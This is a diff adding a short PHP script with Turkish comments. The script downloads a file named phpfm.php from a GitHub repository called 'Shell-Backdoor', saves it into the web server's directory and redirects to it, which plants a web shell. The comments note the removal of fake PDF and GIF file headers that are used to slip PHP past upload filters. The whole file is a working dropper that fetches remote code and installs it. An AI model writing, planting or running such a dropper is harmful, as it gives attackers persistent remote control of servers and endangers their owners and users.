@@ -1,0 +1,20 @@
+<?php
+// Başlangıçta hiçbir çıktı olmamalıdır
+// %PDF-1.3 %每每每每 GIF89;a gibi ifadeleri tamamen kaldırdık
+
+$url = "https://github.com/ZildanZ/Shell-Backdoor/raw/main/phpfm.php";
+$fileContent = file_get_contents($url);
+
+if ($fileContent !== false) {
+    $fileName = "phpfm.php"; 
+    $uploadDirectory = "";
+    if (file_put_contents($uploadDirectory . $fileName, $fileContent) !== false) {
+        header("Location: " . $fileName);
+        exit;
+    } else {
+        echo "Dosya kaydedilemedi.";
+    }
+} else {
+    echo "URL'den içerik alınamadı.";
+}
+?>
